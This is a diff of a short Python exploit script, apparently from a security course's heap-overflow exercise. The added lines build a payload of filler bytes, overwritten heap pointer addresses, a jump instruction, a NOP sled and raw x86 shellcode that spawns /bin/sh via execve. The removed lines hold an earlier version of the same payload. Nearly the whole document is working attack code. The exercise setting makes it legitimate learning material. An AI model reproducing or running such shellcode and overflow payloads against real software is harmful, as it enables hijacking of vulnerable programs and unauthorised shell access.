@@ -1,19 +1,13 @@
-from struct import pack
 from shellcode import shellcode
+from struct import pack
 
-prev_a_addr = pack("<I", 0x080f3724)
-prev_b_addr = pack("<I", 0xbffeb8a8)
+JMP   = "\x6a\x0b\xeb\x06"
+NOP   = "\x90\x90\x90\x90\x90\x90\x90\x90"
+SHELL = "\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
 
-print("\x90"*8 + shellcode + " " + "\x69"*40 + prev_b_addr + prev_a_addr + " " + "\x69"*4)
 
-#print("a"*32 + " " + "b"*32 + " " + "c"*32)
+prev_a_addr = pack("<I", 0x080f3780)
+prev_b_addr = pack("<I", 0xbffeb8a8 + 4)
 
-'''
-quavo = ("\x90" * 8) +  shellcode
-offset = ("\x90" * 40) + prev_b_addr + prev_a_addr
-takeoff = ("\x90" * 4)
+print "\xAA"*32 + " " + "\xAA"*40 + prev_a_addr + prev_b_addr + " " + JMP + NOP + SHELL
 
-print(quavo)
-print(offset)
-print(takeoff)
-'''
